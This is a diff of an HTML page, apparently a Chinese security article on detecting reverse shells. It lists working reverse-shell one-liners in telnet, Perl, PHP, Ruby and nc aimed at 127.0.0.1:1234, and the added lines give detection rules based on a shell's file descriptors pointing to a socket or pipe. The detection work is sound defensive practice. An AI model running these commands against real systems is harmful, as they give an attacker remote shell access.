@@ -157,6 +157,9 @@ rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</s
 <div class="highlight"><pre><span></span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/bash <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">12345</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG61.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了bash进程，0和1描述符都指向了pipe。
+匹配规则：bash进程的0，和1文件描述符指向pipe</p>
 <div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
 
 <span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[127.0.0.1]:[1234]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span>
@@ -170,12 +173,21 @@ rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</s
 <div class="highlight"><pre><span></span><span class="x">php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了sh进程，0和1描述符都指向了socket。</p>
+<p>匹配规则：sh的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span><span class="x">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234")'</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG53.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。</p>
+<p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了sh进程，0和1描述符都指向了socket。</p>
+<p>匹配规则：sh的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span>nc -e /bin/sh <span class="m">127</span>.0.0.1 <span class="m">1234</span>
 
 如果nc 不支持 -e
